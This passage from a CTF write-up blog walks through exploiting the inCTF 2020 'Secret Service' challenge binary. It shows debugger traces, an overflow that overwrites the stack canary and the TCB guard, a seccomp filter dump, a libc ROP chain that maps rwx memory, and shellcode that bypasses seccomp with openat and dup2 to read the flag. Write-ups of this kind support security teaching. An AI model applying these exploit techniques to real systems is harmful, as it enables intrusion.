+$rdi   : 0x0               
+$rip   : 0x00005555555554c9
+$r8    : 0x0               
+$r9    : 0x10              
+$r10   : 0x0               
+$r11   : 0x0               
+$r12   : 0x7fffffffec6e    
+$r13   : 0x7fffffffec6f    
+$r14   : 0x7fffffffec70    
+$r15   : 0x7ffff7d3afc0    
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x5555555554bc                  mov    edx, 0x1
+   0x5555555554c1                  mov    rsi, rax
+   0x5555555554c4                  mov    edi, 0x0
+ → 0x5555555554c9                  call   0x555555555110 &lt;read@plt&gt;
+   ↳  0x555555555110 &lt;read@plt+0&gt;     jmp    QWORD PTR [rip+0x3e2a]        # 0x555555558f40 &lt;read@got.plt&gt;
+      0x555555555116 &lt;read@plt+6&gt;     push   0xe
+      0x55555555511b &lt;read@plt+11&gt;    jmp    0x555555555020
+      0x555555555120 &lt;srand@plt+0&gt;    jmp    QWORD PTR [rip+0x3e22]        # 0x555555558f48 &lt;srand@got.plt&gt;
+      0x555555555126 &lt;srand@plt+6&gt;    push   0xf
+      0x55555555512b &lt;srand@plt+11&gt;   jmp    0x555555555020
+──────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+[!] Unmapped address
+
+gef➤  x/30gx 0x7ffff7d3ae50
+0x7ffff7d3ae50:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3ae60:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3ae70:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3ae80:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3ae90:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3aea0:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3aeb0:	0x0000000000000000	0x9ba031482374c300    &lt;= local canary
+0x7ffff7d3aec0:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3aed0:	0x00007ffff7d3aef0	0x000055555555565f
+0x7ffff7d3aee0:	0x00007ffff7d3b700	0x0000000000000000
+0x7ffff7d3aef0:	0x0000000000000000	0x00007ffff7d48609
+0x7ffff7d3af00:	0x0000000000000000	0x00007ffff7d3b700
+0x7ffff7d3af10:	0x00007ffff7d3b700	0xd4b580512c39fc65
+0x7ffff7d3af20:	0x00007fffffffec6e	0x00007fffffffec6f
+0x7ffff7d3af30:	0x00007fffffffec70	0x00007ffff7d3afc0
+0x7ffff7d3af40:	0x2b4a6ff67239fc65	0x2b4a6ff8275bfc65
+0x7ffff7d3af50:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3af60:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3af70:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3af80:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3af90:	0x0000000000000000	0x9ba031482374c300
+...
+...
+0x7ffff7d3b670:	0x00007ffff7fc34a0	0x00007ffff7d3bdb8
+0x7ffff7d3b680:	0x0000000000000000	0x00007ffff7f754c0
+0x7ffff7d3b690:	0x00007ffff7f75ac0	0x00007ffff7f763c0
+0x7ffff7d3b6a0:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3b6b0:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3b6c0:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3b6d0:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3b6e0:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3b6f0:	0x0000000000000000	0x0000000000000000
+0x7ffff7d3b700:	0x00007ffff7d3b700	0x000055555555e490
+0x7ffff7d3b710:	0x00007ffff7d3b700	0x0000000000000001
+0x7ffff7d3b720:	0x0000000000000000	0x9ba031482374c300   &lt;== stack guard
+0x7ffff7d3b730:	0xfe32ea5ac028961c	0x0000000000000000
+0x7ffff7d3b740:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Just started my payload with a lot of <code class="language-plaintext highlighter-rouge">A</code>s (overwriting the local canary) and then padded enough <code class="language-plaintext highlighter-rouge">A</code>s to the end of the payload to make sure, that we’ll also be overwriting the stored stack guard.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mi">136</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>			<span class="c1"># overwriting canary
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>	
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mi">4000</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>	<span class="c1"># overwriting TCB</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x000055555555562f in ?? ()
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x4141414141414141 ("AAAAAAAA"?)
+$rbx   : 0x7ffff7d3ae50    
+$rcx   : 0x7ffff7ee808f    
+$rdx   : 0x41414141        
+$rsp   : 0x7ffff7d3ae40    
+$rbp   : 0x7ffff7d3aed0    
+$rsi   : 0x7ffff7fc3723    
+$rdi   : 0x7ffff7fc54c0    
+$rip   : 0x000055555555562f
+$r8    : 0xb               
+$r9    : 0x10              
+$r10   : 0x0               
+$r11   : 0x41414141        
+$r12   : 0x7fffffffec6e    
+$r13   : 0x7fffffffec6f    
+$r14   : 0x7fffffffec70    
+$r15   : 0x7ffff7d3afc0    
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x555555555625                  call   0x555555555070 &lt;puts@plt&gt;
+   0x55555555562a                  nop    
+   0x55555555562b                  mov    rax, QWORD PTR [rbp-0x18]
+ → 0x55555555562f                  xor    rax, QWORD PTR fs:0x28
+   0x555555555638                  je     0x55555555563f
+   0x55555555563a                  call   0x555555555090 &lt;__stack_chk_fail@plt&gt;
+   0x55555555563f                  add    rsp, 0x88
+   0x555555555646                  pop    rbx
+   0x555555555647                  pop    rbp
+
+gef➤ ni
+
+Thread 2 "chall" received signal SIGALRM, Alarm clock.
+0x0000555555555638 in ?? ()
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x7ffff7d3ae50    
+$rcx   : 0x7ffff7ee808f    
+$rdx   : 0x41414141        
+$rsp   : 0x7ffff7d3ae40    
+$rbp   : 0x7ffff7d3aed0    
+$rsi   : 0x7ffff7fc3723    
+$rdi   : 0x7ffff7fc54c0    
+$rip   : 0x0000555555555638
+$r8    : 0xb               
+$r9    : 0x10              
+$r10   : 0x0               
+$r11   : 0x41414141        
+$r12   : 0x7fffffffec6e    
+$r13   : 0x7fffffffec6f    
+$r14   : 0x7fffffffec70    
+$r15   : 0x7ffff7d3afc0    
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x555555555628                  (bad)  
+   0x555555555629                  call   QWORD PTR [rax-0x17ba74b8]
+   0x55555555562f                  xor    rax, QWORD PTR fs:0x28
+ → 0x555555555638                  je     0x55555555563f	TAKEN [Reason: Z]
+   ↳  0x55555555563f                  add    rsp, 0x88
+      0x555555555646                  pop    rbx
+      0x555555555647                  pop    rbp
+      0x555555555648                  ret    
+      0x555555555649                  push   rbp
+      0x55555555564a                  mov    rbp, rsp
+
+...
+
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x4141414141414141 ("AAAAAAAA"?)
+$rcx   : 0x7ffff7ee808f    
+$rdx   : 0x41414141        
+$rsp   : 0x7ffff7d3aee0    
+$rbp   : 0xcafebabe        
+$rsi   : 0x7ffff7fc3723    
+$rdi   : 0x7ffff7fc54c0    
+$rip   : 0xdeadbeef        
+$r8    : 0xb               
+$r9    : 0x10              
+$r10   : 0x0               
+$r11   : 0x41414141        
+$r12   : 0x7fffffffec6e    
+$r13   : 0x7fffffffec6f    
+$r14   : 0x7fffffffec70    
+$r15   : 0x7ffff7d3afc0    
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+[!] Cannot disassemble from $PC
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+[!] Unmapped address
+[!] Cannot access memory at address 0xdeadbeef</code></pre></figure>
+
+<p>So now that we have <code class="language-plaintext highlighter-rouge">rip</code> control, we need to get around some <code class="language-plaintext highlighter-rouge">seccomp</code> rules, which were initialized in the beginning of the challenge. Also, the feedback function dups stdout and stderr file descriptors to <code class="language-plaintext highlighter-rouge">/dev/null</code>, so we cannot just output something anymore.</p>
+
+<p>Let’s check the seccomp rules first</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0000: 0x20 0x00 0x00 0x00000004  A = arch
+0001: 0x15 0x00 0x1f 0xc000003e  if (A != ARCH_X86_64) goto 0033
+0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
+0004: 0x15 0x00 0x1c 0xffffffff  if (A != 0xffffffff) goto 0033
+0005: 0x15 0x1a 0x00 0x00000003  if (A == close) goto 0032
+0006: 0x15 0x19 0x00 0x00000005  if (A == fstat) goto 0032
+0007: 0x15 0x18 0x00 0x00000009  if (A == mmap) goto 0032
+0008: 0x15 0x17 0x00 0x0000000a  if (A == mprotect) goto 0032
+0009: 0x15 0x16 0x00 0x0000000b  if (A == munmap) goto 0032
+0010: 0x15 0x15 0x00 0x00000014  if (A == writev) goto 0032
+0011: 0x15 0x14 0x00 0x00000020  if (A == dup) goto 0032
+0012: 0x15 0x13 0x00 0x00000021  if (A == dup2) goto 0032
+0013: 0x15 0x12 0x00 0x00000023  if (A == nanosleep) goto 0032
+0014: 0x15 0x11 0x00 0x00000025  if (A == alarm) goto 0032
+0015: 0x15 0x10 0x00 0x00000038  if (A == clone) goto 0032
+0016: 0x15 0x0f 0x00 0x0000003c  if (A == exit) goto 0032
+0017: 0x15 0x0e 0x00 0x00000048  if (A == fcntl) goto 0032
+0018: 0x15 0x0d 0x00 0x000000e6  if (A == clock_nanosleep) goto 0032
+0019: 0x15 0x0c 0x00 0x000000e7  if (A == exit_group) goto 0032
+0020: 0x15 0x0b 0x00 0x00000101  if (A == openat) goto 0032
+0021: 0x15 0x0a 0x00 0x00000111  if (A == set_robust_list) goto 0032
+0022: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0027
+0023: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)
+0024: 0x15 0x00 0x08 0x00000000  if (A != 0x0) goto 0033
+0025: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
+0026: 0x15 0x05 0x06 0x00000000  if (A == 0x0) goto 0032 else goto 0033
+0027: 0x15 0x00 0x05 0x00000001  if (A != write) goto 0033
+0028: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # write(fd, buf, count)
+0029: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0033
+0030: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
+0031: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0033
+0032: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+0033: 0x06 0x00 0x00 0x00000000  return KILL</code></pre></figure>
+
+<p>Ok, that’s something we can work with, we just cannot do a simple <code class="language-plaintext highlighter-rouge">execve</code> ropchain.</p>
+
+<p>There are multiple ways to deal with this now, I just went with doing a <code class="language-plaintext highlighter-rouge">mmap(0x40000, 0x1000, 7, 22, 0, 0)</code> ropchain to allocate a <code class="language-plaintext highlighter-rouge">rwx</code> section, read shellcode there and execute it (could have been done in one ropchain, but it was more comfortable to write some asm than editing the ropchain over and over).</p>
+
+<p>So first getting some useful gadgets from the provided libc</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">POPRDI</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x26b72</span>
+<span class="n">POPRSI</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x27529</span>
+<span class="n">POPRDXRBX</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1626d6</span>
+<span class="n">POPRCX</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x9f822</span>
+<span class="n">SYSCALL</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x66229</span>
+<span class="n">POPRAX</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4a550</span>		
+<span class="n">CLEARR8</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000049dfd</span>
+<span class="n">CLEARR9</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x00000000000c9ccf</span>
+<span class="n">MOVR10RDXJMPRAX</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x000000000007b0cb</span>
+<span class="n">RET</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000025679</span></code></pre></figure>
+
+<p>Didn’t find a gadget to directly set <code class="language-plaintext highlighter-rouge">$r10</code>, so I used <code class="language-plaintext highlighter-rouge">mov r10, rdx; jmp rax</code>. For this we’ll have to prepare <code class="language-plaintext highlighter-rouge">rax</code> before executing this gadget to return to our ropchain agin.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mi">136</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
+	
+<span class="c1"># mmap
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDXRBX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x22</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x22</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>	      <span class="c1"># prepare for mov r10
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span>           <span class="c1"># jmp rax will return to next gadget
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MOVR10RDXJMPRAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDXRBX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x22</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">CLEARR8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">CLEARR9</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRCX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x22</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="c1"># read
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDXRBX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40000</span><span class="p">)</span>                 <span class="c1"># jmp to shellcode
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mi">4000</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>	<span class="c1"># pad to overwrite tcb canary</span></code></pre></figure>
+
+<p>When this ropchain is executed, we’ll have a <code class="language-plaintext highlighter-rouge">rwx</code> section at <code class="language-plaintext highlighter-rouge">0x40000</code> and a <code class="language-plaintext highlighter-rouge">read</code> waiting to write into it. After the read, it will just jump into the mmapped region and execute our shellcode.</p>
+
+<p>Checking the seccomp rules again, we cannot simply use an <code class="language-plaintext highlighter-rouge">open</code> syscall, but <code class="language-plaintext highlighter-rouge">openat</code> syscall is allowed, which can be used to open the <code class="language-plaintext highlighter-rouge">flag</code> file.</p>
+
+<figure class="highlight"><pre><code class="language-asm" data-lang="asm">// openat
+mov rax, 0x101      // openat
+mov rdi, -1
+mov rsi, 0x40200    // points to /home/ctf/flag
+xor rdx, rdx
+mov rcx, 0
+syscall</code></pre></figure>
+
+<p>This will open the <code class="language-plaintext highlighter-rouge">flag</code> file and assign the fd <code class="language-plaintext highlighter-rouge">5</code> to it. But trying to read from <code class="language-plaintext highlighter-rouge">5</code> will just result in a <code class="language-plaintext highlighter-rouge">SIGSYS</code> fault, since it’s not allowed to read from that file descriptor by the seccomp rules in place.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0022: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0027
+0023: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)
+0024: 0x15 0x00 0x08 0x00000000  if (A != 0x0) goto 0033
+0025: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
+0026: 0x15 0x05 0x06 0x00000000  if (A == 0x0) goto 0032 else goto 0033</code></pre></figure>
+
+<p>This allows to execure a <code class="language-plaintext highlighter-rouge">read</code> syscall only, if the file descriptor is 0, otherwise seccomp will abort execution.</p>
+
+<p>But we’re allowed to <code class="language-plaintext highlighter-rouge">dup2</code>, so we can easily fix this</p>
+
+<figure class="highlight"><pre><code class="language-asm" data-lang="asm">// dup file to stdin
+xor rax, rax
+mov al, 0x21
+mov rdi, 5
+mov rsi, 0
+syscall
+
+// read file
+xor rax, rax
+mov rdi, 0
+mov rsi, 0x40300
+mov rdx, 100
+syscall</code></pre></figure>
+
+<p>This will dup the flag file descriptor to <code class="language-plaintext highlighter-rouge">0</code>, which enables us again to read from it (and store the file content at <code class="language-plaintext highlighter-rouge">0x403000</code>).</p>
+
+<p>Still, <code class="language-plaintext highlighter-rouge">stdout</code> fd points to <code class="language-plaintext highlighter-rouge">/dev/null</code>, so we cannot write the file content back.</p>
+
+<p>Let’s check the function used for that.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">long</span> <span class="nf">dup_output_to_null</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">res</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+
+  <span class="n">res</span> <span class="o">=</span> <span class="n">dup</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="n">v0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This was used earlier in the binary, when <code class="language-plaintext highlighter-rouge">stdout</code> also needed to be reenabled, so it <code class="language-plaintext highlighter-rouge">dup2</code>s the original <code class="language-plaintext highlighter-rouge">stdout</code> pointer first and this duplicated file descriptor now still exists. We just have to copy it back.</p>
+
+<figure class="highlight"><pre><code class="language-asm" data-lang="asm">// reopen stdout
+xor rax, rax
+mov al, 0x21
+mov rdi, 3
+mov rsi, 1
+syscall
+
+// write output
+xor rax, rax
+mov al, 1
+xor rdi, rdi
+mov rdi, 1
+xor rsi, rsi
+mov rsi, 0x40300
+mov rdx, 0x100
+syscall</code></pre></figure>
+
+<p>This will <code class="language-plaintext highlighter-rouge">dup</code> the original file descriptor back to fd <code class="language-plaintext highlighter-rouge">1</code>, with which we can then write the flag file content back and finally getting our flag.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">SC</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x200</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"/home/ctf/flag</span><span class="se">\x00</span><span class="s">"</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python3 work.py 1
+[*] '/home/kileak/ctf/inctf/secret/handout/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 35.245.143.0 on port 7777: Done
+[*] LEAK          : 0x7f8a6c3e5be0
+[*] LIBC          : 0x7f8a6c1fa000
+[*] Paused (press any to continue)
+[*] Paused (press any to continue)
+[*] Switching to interactive mode
+inctf{wh3r3_d1d_y0u_l4nd_up_f1nally_st4ck_H34p_st4ck_0r_H34p_1963290327101999}
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Illegal instruction
+[*] Got EOF while reading in interactive</code></pre></figure>
+
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=inCTF 2020 - Secret Service&amp;url=https://kileak.github.io/ctf/2020/inctf-secretservice/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2020/inctf-secretservice/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2020/inctf-secretservice';
+        var disqus_title = 'inCTF 2020 - Secret Service';
+        var disqus_url = 'https://kileak.github.io/ctf/2020/inctf-secretservice';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
